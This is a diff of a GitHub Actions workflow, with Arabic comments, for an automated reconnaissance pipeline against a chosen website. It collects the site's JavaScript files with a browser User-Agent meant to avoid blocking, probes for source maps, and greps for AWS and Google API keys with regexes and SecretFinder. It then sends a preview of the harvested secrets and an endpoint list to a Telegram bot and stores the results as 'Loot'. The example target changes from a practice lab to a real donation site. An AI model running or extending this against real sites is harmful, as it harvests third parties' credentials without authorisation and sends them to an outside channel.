@@ -1,10 +1,10 @@
-name: V17 - The Alchemist (Bug Free Edition)
+name: V18 - The Talkative Alchemist (Guaranteed Report)
 
 on:
   workflow_dispatch:
     inputs:
       URL:
-        description: 'Target URL (e.g., https://ginandjuice.shop)'
+        description: 'Target URL (e.g., https://donorbox.org)'
         required: true
 
 jobs:
@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     
     steps:
-      # 1. التثبيت (نفسه)
+      # 1. التثبيت
       - name: Install Tools
         run: |
           sudo apt-get update && sudo apt-get install -y coreutils jq wget unzip python3-pip python3-setuptools
@@ -57,19 +57,16 @@ jobs:
           # History
           echo "${{ github.event.inputs.URL }}" | gau --subs --providers wayback,commoncrawl | grep -E "\.js$" > history_js.txt || true
           
-          # Merge
+          # Merge & Validate
           cat live_js.txt history_js.txt | sort -u > candidates.txt
-          
-          # Validate (User-Agent مهم لتفادي الحظر)
           httpx -l candidates.txt -mc 200 -silent -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -o valid_js.txt
           
-          echo "✅ Valid JS Files: $(wc -l < valid_js.txt)"
+          echo "JS_COUNT=$(wc -l < valid_js.txt)" >> $GITHUB_ENV
 
       # 3. Source Maps
       - name: Check for Source Maps
         run: |
           if [ -s valid_js.txt ]; then
-            echo "🧙‍♂️ Checking for Source Maps..."
             touch source_maps_found.txt
             head -n 30 valid_js.txt | while read url; do
               status=$(curl -o /dev/null -s -w "%{http_code}\n" "${url}.map")
@@ -77,79 +74,75 @@ jobs:
             done
           fi
 
-      # 4. Secrets (تصليح مشكلة GREP)
+      # 4. Secrets
       - name: Extract Secrets
         run: |
           if [ -s valid_js.txt ]; then
-            echo "💎 Mining Secrets..."
             touch secrets.txt
-            
-            # Regex بسيط
             grep -E "AKIA[0-9A-Z]{16}" valid_js.txt >> secrets.txt || true
             grep -E "AIza[0-9A-Za-z_-]{35}" valid_js.txt >> secrets.txt || true
             
-            # SecretFinder (التصليح هنا: إضافة -- قبل السهم)
             head -n 10 valid_js.txt | while read url; do
               python3 secretfinder/SecretFinder.py -i "$url" -o cli >> temp_secrets.txt || true
             done
-            
-            # الحل لمشكلة invalid option
             cat temp_secrets.txt | grep -- "->" >> secrets.txt || true
-            
             sort -u secrets.txt > unique_secrets.txt
+            echo "SECRETS_COUNT=$(wc -l < unique_secrets.txt)" >> $GITHUB_ENV
+          else
+            echo "SECRETS_COUNT=0" >> $GITHUB_ENV
           fi
 
-      # 5. Endpoints
+      # 5. Endpoints (توسيع البحث)
       - name: Deep Endpoint Analysis
         run: |
           if [ -s valid_js.txt ]; then
-            echo "🗺️ Running LinkFinder..."
             touch clean_endpoints.txt
-            head -n 10 valid_js.txt | while read url; do
+            # شغلنا LinkFinder على أول 20 ملف عشان نزود الفرصة
+            head -n 20 valid_js.txt | while read url; do
               python3 linkfinder/linkfinder.py -i "$url" -o cli >> raw_links.txt || true
             done
-            grep -E "^/" raw_links.txt | sort -u > clean_endpoints.txt
+            # تحسين الفلتر عشان يلقط أي مسار يبدأ بـ /
+            grep -oE "(\/)[a-zA-Z0-9_?&=\/\-\#\.]+" raw_links.txt | sort -u > clean_endpoints.txt
+            echo "ENDPOINTS_COUNT=$(wc -l < clean_endpoints.txt)" >> $GITHUB_ENV
+          else
+            echo "ENDPOINTS_COUNT=0" >> $GITHUB_ENV
           fi
 
-      # 6. التبليغ
-      - name: Wizard Alert
+      # 6. التبليغ الإجباري (Guaranteed Report)
+      - name: Send Final Report
         env:
           TG_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
           TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
-          # Secrets
+          MSG="🧪 **JS ALCHEMY REPORT**
+          Target: ${{ github.event.inputs.URL }}
+          
+          📂 JS Files Scanned: ${{ env.JS_COUNT }}
+          💎 Secrets Found: ${{ env.SECRETS_COUNT }}
+          🗺️ Endpoints Found: ${{ env.ENDPOINTS_COUNT }}
+          
+          *(Check Artifacts for details)*"
+          
+          curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \
+          -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
+          
+          # لو فيه أسرار ابعتها
           if [ -s unique_secrets.txt ]; then
-             MSG="💎 **SECRETS MINED!**
-             Target: ${{ github.event.inputs.URL }}
-             
-             $(head -n 10 unique_secrets.txt)"
-             curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" 
+            curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \
+            -d chat_id="$TG_CHAT" -d text="🔥 **Secrets Preview:** $(head -n 5 unique_secrets.txt)"
           fi
           
-          # Endpoints
+          # لو فيه إندبوينتس ابعت الملف
           if [ -s clean_endpoints.txt ]; then
-             COUNT=$(wc -l < clean_endpoints.txt)
-             MSG="🗺️ **DEEP ENDPOINTS**
-             Target: ${{ github.event.inputs.URL }}
-             Count: $COUNT
-             *(File attached)*"
-             curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
-             curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendDocument" -F chat_id="$TG_CHAT" -F document=@"clean_endpoints.txt"
-          fi
-          
-          # Source Maps Alert
-          if [ -s source_maps_found.txt ]; then
-             MSG="🧙‍♂️ **SOURCE MAPS FOUND!**
-             Target: ${{ github.event.inputs.URL }}
-             $(head -n 5 source_maps_found.txt)"
-             curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG"
+             curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendDocument" \
+             -F chat_id="$TG_CHAT" -F document=@"clean_endpoints.txt" -F caption="Endpoints Map"
           fi
 
       # 7. Artifacts
       - name: Upload Artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: V17-Loot
+          name: V18-Loot
           path: |
             valid_js.txt
             unique_secrets.txt
